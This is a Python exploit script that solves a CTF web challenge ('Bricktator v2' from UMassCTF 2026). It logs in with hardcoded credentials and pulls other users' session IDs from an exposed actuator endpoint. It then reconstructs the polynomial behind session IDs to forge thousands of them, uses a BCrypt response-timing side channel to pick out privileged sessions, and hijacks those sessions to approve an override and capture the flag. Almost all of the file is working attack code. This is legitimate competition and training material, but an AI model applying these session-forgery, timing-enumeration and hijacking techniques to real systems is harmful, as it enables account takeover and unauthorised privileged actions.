#!/usr/bin/env python3
"""
Bricktator v2 — UMassCTF 2026 (web, 460pts)

Attack: Timing side channel on CommandWorkFilter BCrypt.
Even with accesslog endpoint disabled, BCrypt(strength=13) still runs for
YANKEE_WHITE sessions when accessing /command. This takes ~1s vs ~10ms for
Q_CLEARANCE sessions. Measure response times to identify YANKEE_WHITE.
"""
import requests, base64, re, time, sys
import concurrent.futures

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://bricktatorv2.web.ctf.umasscybersec.org:8080"
PRIME = 2147483647

def encode_sid(sid): return base64.b64encode(sid.encode()).decode()
def eval_poly(c,x,P):
    y=0
    for i in range(len(c)-1,-1,-1): y=(y*x+c[i])%P
    return y
def make_sid(x,y): return f"{x:05d}-{y:08x}"
def parse_sid(sid):
    p=sid.split('-'); return int(p[0]),int(p[1],16)

# Login
print("[1] Login...", flush=True)
s = requests.Session()
s.post(f"{BASE}/login", data={"username":"bricktator","password":"goldeagle"}, allow_redirects=True)
sc = s.cookies.get("SESSION")
padded = sc + '=' * (4 - len(sc) % 4) if len(sc) % 4 else sc
bk_sid = base64.b64decode(padded).decode()

john_sid = s.get(f"{BASE}/actuator/sessions?username=john_doe").json()["sessions"][0]["id"]
jane_sid = s.get(f"{BASE}/actuator/sessions?username=jane_doe").json()["sessions"][0]["id"]

pts = [parse_sid(bk_sid), parse_sid(john_sid), parse_sid(jane_sid)]
# Reconstruct polynomial
def reconstruct(pts, P):
    (x0,y0),(x1,y1),(x2,y2) = pts
    m = [[1,x0,pow(x0,2,P),y0],[1,x1,pow(x1,2,P),y1],[1,x2,pow(x2,2,P),y2]]
    for c in range(3):
        inv = pow(m[c][c], P-2, P)
        for j in range(4): m[c][j] = m[c][j]*inv%P
        for r in range(3):
            if r!=c:
                f=m[r][c]
                for j in range(4): m[r][j]=(m[r][j]-f*m[c][j])%P
    return [m[i][3] for i in range(3)]

coeffs = reconstruct(pts, PRIME)
all_sids = [make_sid(x, eval_poly(coeffs, x, PRIME)) for x in range(1, 5002)]
print(f"    {len(all_sids)} session IDs generated", flush=True)

# Timing side channel: measure response time for GET /command
print("[2] Timing side channel scan...", flush=True)

def time_command(sid):
    """Measure response time for GET /command with this session"""
    try:
        start = time.monotonic()
        requests.get(f"{BASE}/command", cookies={"SESSION": encode_sid(sid)},
                    allow_redirects=False, timeout=15)
        elapsed = time.monotonic() - start
        return sid, elapsed
    except:
        return sid, -1

# First calibrate with known sessions
print("    Calibrating...", flush=True)
_, bk_time = time_command(bk_sid)    # YANKEE_WHITE → should be ~1s
_, john_time = time_command(john_sid)  # Q_CLEARANCE → should be fast
print(f"    Bricktator (YW): {bk_time:.3f}s", flush=True)
print(f"    John_Doe (QC):   {john_time:.3f}s", flush=True)

THRESHOLD = (bk_time + john_time) / 2  # midpoint
if bk_time < 0.3:
    THRESHOLD = 0.5  # fallback
print(f"    Threshold: {THRESHOLD:.3f}s", flush=True)

# Scan all candidates (sequential for reliable timing)
candidates = [sid for sid in all_sids if sid != bk_sid]
yankee = [bk_sid]

for i, sid in enumerate(candidates):
    if len(yankee) >= 8:  # find all 7 + bricktator
        break

    _, elapsed = time_command(sid)
    if elapsed > THRESHOLD:
        yankee.append(sid)
        print(f"    ★ YANKEE_WHITE #{len(yankee)}: {sid} (t={elapsed:.3f}s) [tested {i+1}]", flush=True)

    if (i+1) % 200 == 0:
        print(f"    Progress: {i+1}/{len(candidates)}, found {len(yankee)} YW", flush=True)

print(f"\n[3] Found {len(yankee)} YANKEE_WHITE:", flush=True)
for sid in yankee: print(f"    {sid}", flush=True)

if len(yankee) < 5:
    print("Not enough!", flush=True)
    sys.exit(1)

# Override
print("\n[4] Override...", flush=True)
s.get(f"{BASE}/command")
r = s.post(f"{BASE}/command/override", timeout=120)
tok = re.search(r'([a-f0-9]{32})', r.text)
token = tok.group(1)
print(f"    Token: {token}", flush=True)

for i, sid in enumerate(yankee[1:5], 2):
    print(f"[5] Approval #{i}: {sid}...", flush=True)
    r = requests.post(f"{BASE}/override/{token}",
                      cookies={"SESSION": encode_sid(sid)}, timeout=120)
    if "UMASS{" in r.text:
        flag = re.search(r'UMASS\{[^}]+\}', r.text)
        print(f"\n[+] FLAG: {flag.group(0)}", flush=True)
        sys.exit(0)
    if "RECORDED" in r.text:
        print(f"    ✓ Approved", flush=True)
    elif "terminated" in r.text.lower():
        print(f"    ✗ CANCELLED — retrying with different combo", flush=True)
        # Try next combo from remaining yankee sessions
        break
    else:
        print(f"    ? {r.text[:100]}", flush=True)
